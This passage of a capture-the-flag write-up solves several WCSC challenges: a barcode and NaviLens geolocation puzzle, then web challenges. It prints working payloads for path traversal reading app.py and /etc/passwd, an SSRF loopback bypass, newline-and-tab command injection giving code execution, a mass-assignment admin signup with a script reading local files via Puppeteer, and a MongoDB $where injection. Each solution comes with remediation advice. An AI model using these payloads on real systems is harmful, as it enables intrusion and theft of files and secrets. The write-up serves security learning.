+<td><code>ORD</code></td>
+<td>Chicago O'Hare</td>
+</tr>
+<tr>
+<td>To City Airport (3)</td>
+<td><code>FAR</code></td>
+<td>Fargo, Hector International</td>
+</tr>
+<tr>
+<td>Operating carrier (3)</td>
+<td><code>UA</code></td>
+<td>United Airlines</td>
+</tr>
+<tr>
+<td>Flight Number (5)</td>
+<td><code>5679</code></td>
+<td>UA 5679</td>
+</tr>
+<tr>
+<td>Date of Flight (3)</td>
+<td><code>298</code></td>
+<td>day 298 of the year (no year in the field)</td>
+</tr>
+<tr>
+<td>Compartment / Seat</td>
+<td><code>Y</code> / <code>OVSL</code></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>We read "here" in "just come meet me here" as the destination, FAR. The challenge wording "how FAR he is asking him to travel" is also a pun on the airport code.</p>
+<h4 id="2-2-jake-navilens-ddtag-colour-code">2-2. Jake — NaviLens (ddTag) colour code</h4>
+<p>The 80 x 87 px image is not a picture but a NaviLens marker. Inside a white quiet zone sits a black square containing a 5 x 5 grid of Cyan / Magenta / Yellow / Black cells. Each colour encodes 2 bits.</p>
+<table>
+<thead>
+<tr>
+<th>Symbol</th>
+<th>Colour</th>
+<th>Bits</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C</td>
+<td>Cyan</td>
+<td><code>00</code></td>
+</tr>
+<tr>
+<td>M</td>
+<td>Magenta</td>
+<td><code>01</code></td>
+</tr>
+<tr>
+<td>Y</td>
+<td>Yellow</td>
+<td><code>10</code></td>
+</tr>
+<tr>
+<td>K</td>
+<td>Black</td>
+<td><code>11</code></td>
+</tr>
+</tbody>
+</table>
+<p>The four corner cells carry the palette and orientation, the centre cell carries the size, and the remaining cells of the centre row/column carry the CRC. The message is read from the remaining cells, each column top-to-bottom, columns left-to-right.</p>
+<p>Grid as read:</p>
+<pre><code>C K M M M
+K M M M M
+K Y C C C
+M K K Y K
+K M M Y Y
+</code></pre>
+<p>→ 24-bit message <code>110111011101010110100111</code> = <code>0xDDD5A7</code></p>
+<p>Because of the low resolution one cell was misclassified and the CRC disagreed. The automatic reader classified row 3, column 2 as Cyan, under which the stored CRC <code>0xC5D0</code> did not match the computed <code>0xE5D0</code>. Treating that cell as Yellow makes them agree. Since the corrected cell lies in the CRC area, the message ID itself is unchanged.
+(CRC parameters: polynomial <code>0xC867</code>, init <code>0</code>, no input/output reflection, final XOR <code>0</code>.)</p>
+<h4 id="2-3-id-place-lookup">2-3. ID → place lookup</h4>
+<p>A NaviLens marker carries only an ID, so the registered record must be queried. We opened the Android app with JADX to recover the request path and signing scheme (<code>NaviLensAPIInterface</code>, <code>TagPetition</code>, <code>BaseAPI</code>, <code>NaviLensSignatureManager</code>, <code>CONSTANTS</code>).</p>
+<pre><code class="language-http">POST https://cloud.navilens.com/securized/services/tags/info
+Content-Type: application/json; charset=UTF-8
+x-date: &lt;UTC timestamp&gt;
+authorization: Bearer &lt;signature&gt;
+</code></pre>
+<p>String to sign (joined with LF):</p>
+<pre><code>POST
+/securized/services/tags/info
+&lt;lowercase hex MD5 of the body bytes&gt;
+application/json; charset=UTF-8
+&lt;same UTC timestamp as x-date&gt;
+</code></pre>
+<p><code>signature = Base64(HMAC-SHA512(client signing constant from the app, string above))</code></p>
+<p>The key is the literal bytes of the app's constant string (it is not hex-decoded first).</p>
+<p>Fields from the response used for the location:</p>
+<pre><code class="language-json">{
+  &quot;code&quot;: &quot;DDD5A7&quot;,
+  &quot;name&quot;: &quot;411-8-CTA-13&quot;,
+  &quot;locale&quot;: &quot;en&quot;,
+  &quot;description_offline&quot;: &quot;Brooklyn Bridge-City Hall elevator entry to 4, 5, 6, J and Z train.  &quot;
+}
+</code></pre>
+<p>→ Jake is at the Brooklyn Bridge–City Hall station elevator entrance in Manhattan, New York (inside City Hall Park, near Chambers St / Centre St).</p>
+<h3 id="3-steps_2">3. Steps</h3>
+<ol>
+<li>Identify the format of both images: Jonathan = PDF417, Jake = NaviLens/ddTag.</li>
+<li>Decode the PDF417 (in the sandbox: <code>pip install --break-system-packages zxing-cpp</code>):</li>
+</ol>
+<pre><code class="language-python">from PIL import Image
+import zxingcpp
+im = Image.open('jonathan_VERT_IMG_0238.png')
+res = zxingcpp.read_barcodes(im)          # decodes in the original orientation
+t = res[0].text
+print(t[30:33], t[33:36], t[36:39].strip(), t[39:44].strip())   # ORD FAR UA 5679
+</code></pre>
+<ol start="3">
+<li>Read the NaviLens 5x5 cells → 24-bit message → verify the CRC (one cell corrected) → ID <code>DDD5A7</code>.</li>
+<li>Query the NaviLens cloud API for the registered record → Brooklyn Bridge–City Hall station entrance.</li>
+<li>Compute the great-circle distance between the two points and round to the nearest 10.</li>
+</ol>
+<p><strong>Cross-checks (performed independently in this repository)</strong></p>
+<ul>
+<li>Sampling the 5 x 5 cells directly from the original 80 x 87 image and classifying them in CMYK reproduced 23 of the 25 cells. The two mismatches are black (K) cells, which have no saturation and so fell outside the hue bounding box; neither format identification nor the ID is affected.</li>
+<li>Distance was computed with <code>tools/wcsc-here-there/dist.py</code> under both a spherical and an ellipsoidal model.</li>
+</ul>
+<h3 id="4-result_2">4. Result</h3>
+<p>Coordinates (the NaviLens response has no coordinate field, so a representative point near the station entrance was used):</p>
+<table>
+<thead>
+<tr>
+<th>Point</th>
+<th>Latitude</th>
+<th>Longitude</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Jake — near Brooklyn Bridge–City Hall station entrance</td>
+<td>40.7131500</td>
+<td>-74.0048000</td>
+</tr>
+<tr>
+<td>Jonathan's destination — Hector International (FAR)</td>
+<td>46.9206389</td>
+<td>-96.8157500</td>
+</tr>
+</tbody>
+</table>
+<pre><code>haversine (sphere, R=6371.0088 km): 1210.067 mi  -&gt; 1210
+vincenty  (WGS84 geodesic)        : 1212.834 mi  -&gt; 1210
+</code></pre>
+<p>Both models round to 1210 at the nearest 10. Moving Jake's coordinate by about 1.5 miles changes the distance by only 0.3 miles, so the result is stable well inside the rounding band (1205–1215): the exact choice of point at the station entrance does not affect the answer.</p>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{1210}</code></li>
+<li>Time obtained: 2026-10-30 14:43 UTC (23:43 KST)</li>
+<li>Evidence: <code>evidence/wcsc-here-there/</code> (<code>bcbp.txt</code> with the raw BCBP and field parsing, <code>exif-gps.txt</code>, <code>SEARCH_*.png</code> enlargements, <code>jake_art_x20.png</code>, etc.), <code>tools/wcsc-here-there/dist.py</code></li>
+</ul>
+<h3 id="5-interpretation-caveats-limits-of-the-evidence">5. Interpretation caveats (limits of the evidence)</h3>
+<ul>
+<li><strong>EXIF GPS is not the subject's location.</strong> Jonathan's image retains EXIF GPS pointing at 27.797469, -82.293686 (Hillsborough County, Florida). However <code>GPSHPositioningError ≈ 5,094 m</code> and there is no landmark at that coordinate. This is a trace of where the printout was photographed, not the meeting place. We used the boarding pass destination, FAR.</li>
+<li><strong>Choosing the destination is an inference.</strong> The PDF417 only establishes an <code>ORD → FAR</code> itinerary; FAR was taken as the meeting point from the "meet me here" context.</li>
+<li><strong>For NaviLens, recovering the ID and fixing the location are separate steps.</strong> Recovering <code>DDD5A7</code> and verifying its CRC does not by itself yield New York. The direct basis for the location is the registered record returned for that ID.</li>
+<li><strong>Jake's coordinate is not GPS extracted from the marker.</strong> It is a representative point near the station entrance; the sensitivity check above shows the answer does not change.</li>
+<li>As of writing, there is no record of submitting this to the scoring server and receiving a verdict.</li>
+</ul>
+<h3 id="6-post-mortem-analysis-failure-worth-recording">6. Post-mortem (analysis failure worth recording)</h3>
+<p>We initially misread Jake's image as "a framed geometric abstract painting" and spent time searching art databases. Degraded to 80 x 87 px, the white quiet zone looked like a mat, the black border like a frame, and the CMYK cells like colour-field composition.</p>
+<p>Decision rule: a grid of square cells in exactly four CMYK colours on a black background, surrounded by a white margin, should be suspected as a colour 2D code (NaviLens / ddTag / HCCB family) before it is treated as artwork. Check whether the colours are quantised to four values and whether the cell boundaries align to a grid. Counting cells remains possible even at low resolution.</p>
+<hr>
+<h2 id="3-web-anything-for-our-members-750">3. [Web] Anything for Our Members — 750</h2>
+<h3 id="1-problem-summary_3">1. Problem summary</h3>
+<ul>
+<li>Provided: only the server URL <code>https://wcsc-anything-for-our-members.chals.io</code> (source not published — full black box)</li>
+<li>Goal: flag <code>WCSC{...}</code></li>
+<li>Hint (0 points): "Have you visited everywhere you can be on the website?"</li>
+</ul>
+<p>Five vulnerabilities must be chained in order to reach the flag.</p>
+<h3 id="2-analysis_3">2. Analysis</h3>
+<p><strong>Reconnaissance</strong></p>
+<ul>
+<li><code>GET /</code> → 302 to <code>/login</code>. Header <code>Server: Werkzeug/3.1.8 Python/3.12.13</code> → Flask development server.</li>
+<li><code>/login</code> is a static page whose JS posts JSON <code>{username, password}</code> to <code>POST /api/login</code>. No registration feature.</li>
+<li><code>/robots.txt</code>, <code>/sitemap.xml</code>, <code>/register</code>, <code>/static/</code>, <code>/admin</code>, <code>/console</code>, <code>/flag</code> all return 404.</li>
+<li><code>/dashboard</code> redirects (302) to <code>/login</code>. There is no legitimate way in.</li>
+</ul>
+<p><strong>Vulnerability 1 — unauthenticated API index disclosure (information exposure)</strong></p>
+<p>Reading the hint "everywhere you can be" as "every point reachable without authentication", we checked <code>/api</code>:</p>
+<pre><code>GET /api  → 200 application/json
+{&quot;/api&quot;:{&quot;/login&quot;:&quot;Authenticate to member site, requires 'username' and 'password' - JSON POST parameters&quot;,
+         &quot;/test&quot;:{&quot;/announce&quot;:&quot;IN PROGRESS&quot;,
+                  &quot;/read&quot;:&quot;Read public member bios, requires 'bio' - GET parameter&quot;}}}
+</code></pre>
+<p>A development route index is exposed verbatim, revealing <code>/api/test/read</code>.</p>
+<p><strong>Vulnerability 2 — arbitrary file read in <code>/api/test/read</code></strong></p>
+<p>Differences in the response messages let us reverse the internal logic:</p>
+<table>
+<thead>
+<tr>
+<th>Input</th>
+<th>Response</th>
+<th>Interpretation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>bio=jonathan.txt</code></td>
+<td><code>Invalid bio file, …</code></td>
+<td>exception raised = file not found</td>
+</tr>
+<tr>
+<td><code>bio=bios/jonathan.txt</code></td>
+<td><code>ummm, what the sigma?</code></td>
+<td>success (bio file contents)</td>
+</tr>
+<tr>
+<td><code>bio=app.py</code></td>
+<td><code>error, bio must specify correct directory</code></td>
+<td>the file opened, then failed the directory check</td>
+</tr>
+</tbody>
+</table>
+<p>The third row is decisive: the check runs <em>after</em> the file is opened, so even when the check fails the response leaks the fact that the file exists. The actual code, recovered later:</p>
+<pre><code class="language-python">@app.route('/api/test/read')
+def api_test_read():
+    bio = str(request.args.get('bio'))
+    bio_path = bio
+    try:
+        with open(f'/app/member-site/{bio_path}', &quot;r&quot;, encoding=&quot;utf-8&quot;) as file:
+            bio_content = file.read()      # (1) read before any check
+        if 'bios' not in bio_path:         # (2) substring check with no path normalisation
+            return &quot;error, bio must specify correct directory&quot;
+        return bio_content
+    except Exception as e:
+        return &quot;Invalid bio file, valid files in bios/: …&quot;
+</code></pre>
+<p>Because (2) never normalises the path and only tests whether the string contains <code>bios</code>, <code>bios/../</code> bypasses it entirely.</p>
+<pre><code>?bio=bios/../app.py                → full text of /app/member-site/app.py
+?bio=bios/../../../etc/passwd      → /etc/passwd
+</code></pre>
+<p><strong>Vulnerability 3 — secrets hardcoded in source</strong></p>
+<p>From <code>app.py</code>:</p>
+<ul>
+<li><code>app.config['SECRET_KEY'] = "aosihdadas98hdqin23oriqwhd8sya89jnu283rjhinqfkoia8"</code> → session cookies can be forged</li>
+<li>Hardcoded credentials under a <code>#TODO: Remove hardcoded credentials</code> comment: <code>administrator</code> / <code>2e97aba8ea21fb90774c81dbde78a32d</code></li>
+<li>A route absent from the <code>/api</code> index: <code>POST /api/authenticated/upload</code> (requires login)</li>
+</ul>
+<p><strong>Vulnerability 4 — blacklist-based SSRF filter</strong></p>
+<pre><code class="language-python">@app.route('/api/authenticated/upload', methods = ['POST'])
+def api_authenticated_upload():
+    if not check_login(): return &quot;forbidden&quot;, 401
+    url = str(request.get_json()['url'])
+    #TODO: Remember to add a firewall rule that drops all traffic from the webserver to localhost:1234
+    #for now this filter should do
+    if not url.startswith('http://'): return &quot;error, invalid URL schema&quot;
+    if 'localhost' in url or '127.0.0.1' in url: return &quot;error, disallowed host&quot;
+    response = get(url)
+    return response.text          # returns the body verbatim → full read SSRF
+</code></pre>
+<p>The deny list contains exactly two strings. The loopback interface has many other spellings (<code>0.0.0.0</code>, <code>0</code>, <code>127.1</code>, <code>[::1]</code>, <code>2130706433</code>). The comment even names the target, localhost:1234.</p>
+<p><strong>Vulnerability 5 — command injection in the internal dashboard</strong></p>
+<p>Reaching <code>http://0.0.0.0:1234/</code> via SSRF produced a "Server Management" page, and <code>/list-processes</code> showed two applications running in the same container:</p>
+<pre><code>www-data 85 python3 /app/member-site/app.py
+www-data 86 python3 /app/internal-admin-leet-dashboard/app.py
+</code></pre>
+<p>Reading that second path back through vulnerability 2 gave the internal application's source:</p>
+<pre><code class="language-python">@app.route('/search-packages')
+def search_packages():
+    package = str(request.args.get('package'))
+    blacklisted_characters = [&quot;;&quot;, &quot;|&quot;, &quot;&amp;&quot;, &quot;$&quot;, &quot; &quot;]
+    if any(char in blacklisted_characters for char in package):
+        return &quot;errorm, restricted character detected&quot;
+    result = subprocess.run(f'apt-cache search {package}', shell=True, capture_output=True, text=True)
+    output = result.stdout
+    return output
+</code></pre>
+<p>A string is passed to the shell with <code>shell=True</code> while the deny list contains only five characters — newline and tab are missing.</p>
+<ul>
+<li>newline (<code>%0a</code>) = command separator (replaces <code>;</code>)</li>
+<li>tab (<code>%09</code>) = argument separator (replaces space)</li>
+</ul>
+<h3 id="3-steps_3">3. Steps</h3>
+<ol>
+<li>Obtain <code>/api/test/read</code> from <code>/api</code> (vulnerability 1).</li>
+<li>Read the main application source via arbitrary file read (vulnerability 2):</li>
+</ol>
+<pre><code>curl -G 'https://wcsc-anything-for-our-members.chals.io/api/test/read' \
+  --data-urlencode 'bio=bios/../app.py'
+</code></pre>
+<ol start="3">
+<li>Log in with the hardcoded credentials (vulnerability 3):</li>
+</ol>
+<pre><code>curl -c cookies.txt -X POST .../api/login -H 'Content-Type: application/json' \
+  -d '{&quot;username&quot;:&quot;administrator&quot;,&quot;password&quot;:&quot;2e97aba8ea21fb90774c81dbde78a32d&quot;}'
+→ 200 success  (session cookie issued)
+</code></pre>
+<ol start="4">
+<li>Bypass the SSRF filter with <code>0.0.0.0</code> and reach the internal service (vulnerability 4):</li>
+</ol>
+<pre><code>curl -b cookies.txt -X POST .../api/authenticated/upload -H 'Content-Type: application/json' \
+  -d '{&quot;url&quot;:&quot;http://0.0.0.0:1234/&quot;}'
+→ internal &quot;Server Management&quot; HTML
+</code></pre>
+<ol start="5">
+<li>Use <code>/list-processes</code> to find the internal application path, then read its source through vulnerability 2 to confirm the deny list:</li>
+</ol>
+<pre><code>--data-urlencode 'bio=bios/../../internal-admin-leet-dashboard/app.py'
+</code></pre>
+<ol start="6">
+<li>Command injection with newline + tab → RCE (vulnerability 5):</li>
+</ol>
+<pre><code>curl -b cookies.txt -X POST .../api/authenticated/upload -H 'Content-Type: application/json' \
+  -d '{&quot;url&quot;:&quot;http://0.0.0.0:1234/search-packages?package=%0aid%0als%09-la%09/%0als%09-la%09/app&quot;}'
+→ uid=33(www-data) gid=33(www-data)
+  /app/ ... -rw-r--r-- 1 root root 41 flag_1837rywqdhua.txt
+</code></pre>
+<ol start="7">
+<li>Read the flag (vulnerability 2 alone suffices):</li>
+</ol>
+<pre><code>curl -G .../api/test/read --data-urlencode 'bio=bios/../../flag_1837rywqdhua.txt'
+→ WCSC{S0_MuCh_S3rvEr_S1d3_Inf0rm47ioN!!!!}
+</code></pre>
+<h3 id="4-result_3">4. Result</h3>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{S0_MuCh_S3rvEr_S1d3_Inf0rm47ioN!!!!}</code></li>
+<li>Time obtained: 2026-10-30 13:59 UTC (22:59 KST)</li>
+<li>About 30 requests total, mostly single-path checks. No brute forcing, fuzzing or destructive commands.</li>
+<li>Evidence: <code>evidence/wcsc-members/01-root.*</code> through <code>17-build-files.txt</code> (key files: <code>04-api.txt</code> API index, <code>10-app.py</code> main source, <code>14-internal-app.py</code> internal source, <code>15-rce-ls.txt</code> RCE, <code>16-flag.txt</code> flag)</li>
+</ul>
+<h3 id="5-root-cause-and-remediation_2">5. Root cause and remediation</h3>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Vulnerability</th>
+<th>Classification</th>
+<th>Fix</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>/api</code> exposes the route index without authentication</td>
+<td>CWE-200 / CWE-489 (leftover debug feature)</td>
+<td>Remove it from production builds or move it behind authentication</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>open()</code> before validation; substring check <code>'bios' not in path</code></td>
+<td>CWE-22 path traversal (+ CWE-209 information exposure through error messages)</td>
+<td>Compare against an allow list (<code>if name not in os.listdir(BIOS)</code>), then <code>os.path.join</code> + <code>os.path.realpath</code> and verify the result stays under the base directory. Move the check before <code>open()</code>. Generalise exception messages.</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>SECRET_KEY</code> and credentials hardcoded</td>
+<td>CWE-798 / CWE-547</td>
+<td>Move to environment variables or a secret store; store passwords hashed (bcrypt/argon2) in a database; rotate the leaked key immediately</td>
+</tr>
+<tr>
+<td>4</td>
+<td>String deny list as an SSRF filter</td>
+<td>CWE-918</td>
+<td>Switch to an allow list (domains, schemes). Resolve DNS and block private, loopback and link-local ranges (RFC1918, 127/8, 0.0.0.0, ::1, 169.254/16), and re-validate on redirects. Block internal services at the network layer — actually apply the firewall rule from the comment.</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>shell=True</code> plus a character deny list</td>
+<td>CWE-78 OS command injection</td>
+<td>Drop <code>shell=True</code> and pass an argument array: <code>subprocess.run(['apt-cache','search',package])</code>. Validate input against an allow list such as <code>^[a-z0-9.+-]+$</code>. Deny lists are always bypassable via newline, tab, <code>\r</code>, <code>{}</code>, <code>&lt;&gt;</code> and similar.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Additional recommendations</strong></p>
+<ul>
+<li>Making <code>/app</code> owned by <code>root:root</code> to deny <code>www-data</code> write access was good, but read access alone exposed all source and the flag. Do not keep secrets in plaintext on paths readable by the application process, and do not rely on randomised filenames (<code>flag_1837rywqdhua.txt</code>).</li>
+<li>Running both applications in a single container via <code>entry.sh</code> is what turned SSRF directly into access to internal management functionality. Services on different trust boundaries belong in separate containers and networks.</li>
+</ul>
+<hr>
+<h2 id="4-web-moth-busters-500">4. [Web] Moth Busters — 500</h2>
+<h3 id="1-problem-summary_4">1. Problem summary</h3>
+<ul>
+<li>Provided: server URL <code>https://wcsc-moth-busters.chals.io</code> and the source archive <code>public.zip</code> (sha256 <code>64058260d7065b998b370ae0519b724ca3b690bbb8f52bac08ee4bca326a3b11</code>)</li>
+<li>Goal: disprove the claim that the PsiFiveInformationLabs website is indestructible; obtain the flag <code>WCSC{...}</code></li>
+<li>Constraint: the instance is shared by all participants → no destructive actions, no excessive requests, use a unique account name</li>
+</ul>
+<h3 id="2-analysis_4">2. Analysis</h3>
+<ul>
+<li>Stack: Node 20 + Express 4.21 + express-session + better-sqlite3 (<code>:memory:</code>) + EJS + Puppeteer 23.3</li>
+<li>Flag location (Dockerfile): <code>COPY flag.txt /flag_ashbdygsq.txt</code> (because of <code>COPY . .</code>, the same file also remains at <code>/app/flag.txt</code>)</li>
+</ul>
+<p><strong>Dead ends first</strong></p>
+<ul>
+<li><code>admin</code> password = <code>crypto.randomBytes(32).toString('hex')</code> → not guessable or crackable</li>
+<li>Session secret = <code>crypto.randomBytes(64)</code> → sessions cannot be forged</li>
+<li>All queries use prepared statements → no SQL injection</li>
+</ul>
+<p>→ The attack surface is <code>/register</code> and the admin-only report generator.</p>
+<p><strong>Vulnerability 1 — mass assignment to gain admin (server.js:85-102)</strong></p>
+<pre><code class="language-js">app.post('/register', (req, res) =&gt; {
+  const { username, password } = req.body;
+  ...
+  db.prepare('INSERT INTO users (username, password, is_admin) VALUES (?, ?, ?)')
+    .run(username, bcrypt.hashSync(password, 10), req.body.is_admin ? 1 : 0);
+</code></pre>
+<p>The registration form (<code>views/register.ejs</code>) has no <code>is_admin</code> field, but the server trusts <code>is_admin</code> from the request body and inserts it directly. Adding <code>is_admin=1</code> to the registration request creates an administrator account.</p>
+<p><strong>Vulnerability 2 — HTML injection in the report generator → local file read via Puppeteer <code>file://</code> (server.js:114-203)</strong></p>
+<pre><code class="language-js">const html = `… &lt;h1&gt;${title}&lt;/h1&gt; …
+  &lt;div class=&quot;content&quot;&gt;${content}&lt;/div&gt; …`;          // no escaping
+const tmpFile = path.join(os.tmpdir(), `report-….html`);
+fs.writeFileSync(tmpFile, html);
+browser = await puppeteer.launch({
+  args: ['--no-sandbox', '--disable-setuid-sandbox',
+         '--disable-dev-shm-usage', '--allow-file-access-from-files'] });
+const page = await browser.newPage();
+await page.goto(`file://${tmpFile}`, { waitUntil: 'load', timeout: 10000 });
+await new Promise(r =&gt; setTimeout(r, 500));
+const pdf = await page.pdf({ format: 'A4', printBackground: true });
+</code></pre>
+<p>Three conditions combine into arbitrary local file read:</p>
+<ol>
+<li><code>title</code> and <code>content</code> are interpolated straight into a template literal → arbitrary HTML/JS injection</li>
+<li>That HTML is written to a temporary file and loaded with a <code>file://</code> origin</li>
+<li>The Chrome flag <code>--allow-file-access-from-files</code> lets JS on a <code>file://</code> page read other local files as same-origin via <code>XMLHttpRequest</code> (together with <code>--no-sandbox</code>)</li>
+</ol>
+<p>Since the only output is a PDF, the read values need an exfiltration path. Rendering them into the body leaves only glyph IDs (<code>&lt;005F0003…&gt; Tj</code>) because Skia subsets the font as CID, making text extraction hard without a ToUnicode CMap. Chrome, however, writes <code>document.title</code> into the PDF Info dictionary's <code>/Title</code> as a plain literal, so putting the file contents into <code>document.title</code> makes them recoverable with a single <code>strings</code> pass.</p>
+<h3 id="3-steps_4">3. Steps</h3>
+<ol>
+<li>Create an admin account (vulnerability 1):</li>
+</ol>
+<pre><code>curl -X POST https://wcsc-moth-busters.chals.io/register \
+  --data-urlencode 'username=pfil_audit_9f3ac1' \
+  --data-urlencode 'password=Str0ngPass!9f3ac1' \
+  --data-urlencode 'is_admin=1'
+→ 302 /login
+</code></pre>
+<ol start="2">
+<li>Log in and confirm the privilege:</li>
+</ol>
+<pre><code>curl -c cookies.txt -X POST https://wcsc-moth-busters.chals.io/login \
+  --data-urlencode 'username=pfil_audit_9f3ac1' --data-urlencode 'password=Str0ngPass!9f3ac1'
+→ 302 /admin
+</code></pre>
+<p>Because server.js:77 is <code>res.redirect(user.is_admin ? '/admin' : '/dashboard')</code>, the redirect to <code>/admin</code> is itself proof that <code>is_admin=1</code>.</p>
+<ol start="3">
+<li>Inject a local-file-read payload into the report <code>content</code> (vulnerability 2):</li>
+</ol>
+<pre><code class="language-html">&lt;script&gt;
+var r=[];
+['file:///flag_ashbdygsq.txt','file:///app/flag.txt'].forEach(function(p){
+  try{ var x=new XMLHttpRequest(); x.open('GET',p,false); x.send();
+       r.push('OK '+p+' = '+String(x.responseText).trim()); }
+  catch(e){ r.push('ERR '+p+' = '+e.name); }
+});
+document.title='EXFIL{'+r.join(' ;; ')+'}';
+&lt;/script&gt;
+</code></pre>
+<pre><code>curl -b cookies.txt -o report.pdf -X POST \
+  https://wcsc-moth-busters.chals.io/admin/generate-report \
+  --data-urlencode 'title=audit2' --data-urlencode 'content@payload2.html'
+→ HTTP 200, application/pdf, 62387 bytes
+</code></pre>
+<p>The XHR is synchronous, so it completes during parsing and the title is set well within the 500 ms wait before <code>page.pdf()</code>.</p>
+<ol start="4">
+<li>Extract the flag from the PDF metadata:</li>
+</ol>
+<pre><code>strings -a report.pdf | grep Title
+&lt;&lt;/Title (EXFIL{OK file:///flag_ashbdygsq.txt = WCSC{Ps1F1v31nf0L4b5_V1b3_C0d35_4lL}
+          ;; OK file:///app/flag.txt = WCSC{Ps1F1v31nf0L4b5_V1b3_C0d35_4lL}})
+</code></pre>
+<h3 id="4-result_4">4. Result</h3>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{Ps1F1v31nf0L4b5_V1b3_C0d35_4lL}</code></li>
+<li>Time obtained: 2026-10-30 13:55 UTC (22:55 KST)</li>
+<li>4 requests total (4 POSTs). No scanning or brute forcing. The only changes to the shared instance were one added account and two generated reports; no existing data was deleted or modified.</li>
+<li>Evidence: <code>evidence/wcsc-moth-busters/00-account.txt</code>, <code>01-register.html</code>, <code>02-login.html</code>, <code>03-report.pdf</code>, <code>04-report-text.txt</code>, <code>05-report-title.pdf</code></li>
+<li>Supporting tool: <code>tools/pdftext.py</code> (a PDF text extractor for environments without <code>pdftotext</code>; this challenge's PDF used CID-subset fonts so extraction failed, which is what led to the <code>/Title</code> route)</li>
+</ul>
+<h3 id="5-root-cause-and-remediation_3">5. Root cause and remediation</h3>
+<p><strong>Classification</strong></p>
+<ul>
+<li>Vulnerability 1: CWE-915 (improperly controlled modification of dynamically-determined object attributes — mass assignment) → CWE-269 improper privilege management</li>
+<li>Vulnerability 2: CWE-79 / CWE-94 (HTML/script injection via template string interpolation) → arbitrary local file read in the CWE-73 + CWE-22 family (CWE-200 information exposure)</li>
+</ul>
+<p><strong>Fixes</strong></p>
+<ol>
+<li><code>/register</code> should extract only allowed fields explicitly. Never accept <code>is_admin</code> from the request; fix it to 0 server-side:</li>
+</ol>
+<pre><code class="language-js">const { username, password } = req.body;   // do not destructure is_admin
+... .run(username, hash, 0);               // INSERT a constant 0
+</code></pre>
+<p>Privilege changes belong in a separate admin-only endpoint with an audit log.</p>
+<ol start="2">
+<li>Do not build the report HTML by string concatenation. Use an auto-escaping template (EJS <code>&lt;%= %&gt;</code>) or HTML-escape user input.</li>
+<li>Harden the Puppeteer configuration:
+   - Remove <code>--allow-file-access-from-files</code> (this feature does not need it at all)
+   - Do not load via <code>file://</code>; use <code>page.setContent()</code> or <code>about:blank</code> plus a local HTTP origin
+   - <code>page.setJavaScriptEnabled(false)</code> — a report PDF does not need JS
+   - Remove <code>--no-sandbox</code> (keep the sandbox) and run as an unprivileged user inside the container
+   - Optionally set a CSP meta tag with <code>script-src 'none'</code></li>
+<li>Do not place secrets on a filesystem readable by the rendering process. Randomising the filename (<code>/flag_ashbdygsq.txt</code>) is no defence against arbitrary file read on the same host, and <code>COPY . .</code> exposed it a second time at <code>/app/flag.txt</code>.</li>
+</ol>
+<hr>
+<h2 id="5-web-fruit-shop-250">5. [Web] Fruit Shop — 250</h2>
+<h3 id="1-problem-summary_5">1. Problem summary</h3>
+<ul>
+<li>Provided: server URL <code>https://wcsc-fruit-shop.chals.io</code> and the source archive <code>fruit-shop.zip</code> (sha256 <code>c69da760ec66a87ae87c7ecd94421a1143965987ef2b66d5a0ff79590e9a36f5</code>)</li>
+<li>Goal: flag <code>WCSC{...}</code></li>
+<li>The challenge text "I wonder if there's anything hidden for you here" points at retrieving a hidden (non-public) product document</li>
+</ul>
+<h3 id="2-analysis_5">2. Analysis</h3>
+<ul>
+<li>Stack (Dockerfile): MongoDB 8.3 running alongside the app inside a <code>php:8.2-apache</code> container (<code>MONGO_URI=mongodb://127.0.0.1:27017</code>, <code>MONGO_DB=fruitshop</code>, collection <code>fruitshop.products</code>).</li>
+<li>Flag location (seed.php): not a file but a document field.</li>
+</ul>
+<pre><code class="language-php">$flag = getenv('FLAG');
+$privateProduct = ['product_name' =&gt; $flag, 'price' =&gt; 0.00,
+                   'description' =&gt; 'Flag', 'is_public' =&gt; false];
+</code></pre>
+<p><code>index.php</code> renders only <code>run_find(['is_public' =&gt; true])</code>, so the page shows just the 8 public products.</p>
+<p><strong>Vulnerability (search.php) — MongoDB <code>$where</code> server-side JavaScript injection</strong></p>
+<pre><code class="language-php">$searchInput = $_GET['search'] ?? '';
+if (is_array($searchInput)) { $searchInput = ''; }   // blocks array/operator injection
+$term = strtolower((string) $searchInput);           // the only transformation: lowercasing
+$filter = [
+    '$where' =&gt; &quot;this.product_name == '&quot; . $term . &quot;' &amp;&amp; this.is_public == true&quot;,
+];
+</code></pre>
+<p>User input is concatenated directly inside the quoted portion of the JavaScript source passed to <code>$where</code>. There is no escaping and no character allow list. The only constraint is <code>strtolower()</code>, which merely prevents uppercase characters in the payload — <code>this</code>, <code>true</code> and <code>is_public</code> are all lowercase, so it is not a real obstacle.</p>
+<p>The <code>is_array()</code> check also blocks the common NoSQL operator injection (<code>?search[$ne]=</code>), narrowing the path to escaping the quotes inside the <code>$where</code> string.</p>
+<h3 id="3-steps_5">3. Steps</h3>
+<ol>
+<li>Establish the baseline behaviour:</li>
+</ol>
+<pre><code>curl -G 'https://wcsc-fruit-shop.chals.io/search.php' --data-urlencode 'search=honeycrisp apple'
+→ {&quot;ok&quot;:true,&quot;count&quot;:0,&quot;results&quot;:[]}
+</code></pre>
+<p>Because of <code>strtolower</code>, the comparison becomes <code>this.product_name == 'honeycrisp apple'</code>, which can never match the stored value <code>Honeycrisp Apple</code>. In other words the search feature can never find anything (consistent with the "a search box... that's on purpose" comment in <code>index.php</code>). This confirms <code>strtolower</code> is the single transformation applied.</p>
+<ol start="2">
+<li>Close the quote and inject an always-true condition, pushing the <code>is_public</code> clause behind <code>||</code> so it has no effect:</li>
+</ol>
+<pre><code>search=' || true || '
+</code></pre>
+<p>The resulting <code>$where</code> JS:</p>
+<pre><code class="language-javascript">this.product_name == '' || true || '' &amp;&amp; this.is_public == true
+</code></pre>
